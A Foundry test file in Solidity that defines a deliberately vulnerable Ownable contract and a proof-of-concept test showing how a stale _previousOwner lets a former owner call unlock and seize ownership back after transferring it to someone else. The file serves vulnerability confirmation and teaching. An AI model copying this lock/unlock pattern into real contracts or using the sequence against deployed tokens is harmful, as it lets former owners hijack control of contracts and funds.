// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.6;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";

contract VulnerableOwnable {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;
    
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    constructor(address initialOwner) {
        _owner = initialOwner;
        emit OwnershipTransferred(address(0), initialOwner);
    }
    
    function owner() public view returns (address) {
        return _owner;
    }
    
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    
    function lock(uint256 time) public virtual onlyOwner {
        _previousOwner = _owner;
        _owner = address(0);
        _lockTime = block.timestamp + time;
        emit OwnershipTransferred(_owner, address(0));
    }
    
    function unlock() public virtual {
        require(_previousOwner == msg.sender, "You don't have permission to unlock");
        require(block.timestamp > _lockTime, "Lock period not ended");
        emit OwnershipTransferred(_owner, _previousOwner);
        _owner = _previousOwner;
    }
    
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Zero address not allowed");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenLockTest is Test {
    VulnerableOwnable public token;
    address public alice = address(0x1);
    address public bob = address(0x2);
    uint256 public constant LOCK_TIME = 100 seconds;

    function setUp() public {
        token = new VulnerableOwnable(alice);
        assertEq(token.owner(), alice, "Alice should be initial owner");
    }

    function testOwnershipRecoveryAfterTransfer() public {
        // Alice locks ownership
        vm.prank(alice);
        token.lock(LOCK_TIME);
        assertEq(token.owner(), address(0), "Owner should be zero after lock");
        
        // Fast forward past lock period
        vm.warp(block.timestamp + LOCK_TIME + 1);
        
        // Alice unlocks and reclaims ownership
        vm.prank(alice);
        token.unlock();
        assertEq(token.owner(), alice, "Alice should be owner after unlock");

        // Alice transfers ownership to Bob
        vm.prank(alice);
        token.transferOwnership(bob);
        assertEq(token.owner(), bob, "Bob should be new owner");
        
        console.log("--- BEFORE-Trigger Unlock ---");
        address preOwner = token.owner();
        console.log("Pre-unlock owner: %s", preOwner);
        
        console.log("--- Trigger Unlock ---");
        // Alice recovers ownership using stale _previousOwner
        vm.prank(alice);
        token.unlock();
        
        console.log("--- AFTER-Trigger Unlock ---");
        address postOwner = token.owner();
        console.log("Post-unlock owner: %s", postOwner);
        
        // Compare owner before and after unlock
        if (preOwner == bob && postOwner == alice) {
            console.log("Differential verdict: State changed - Vulnerability exploited");
            console.log("Vulnerability Exists: Stale _previousOwner reference enables unauthorized ownership recovery");
        } else {
            console.log("Differential verdict: State unchanged - Vulnerability not exploited");
            console.log("Vulnerability not Exist: Unlock operation didn't change ownership unexpectedly");
        }
    }
}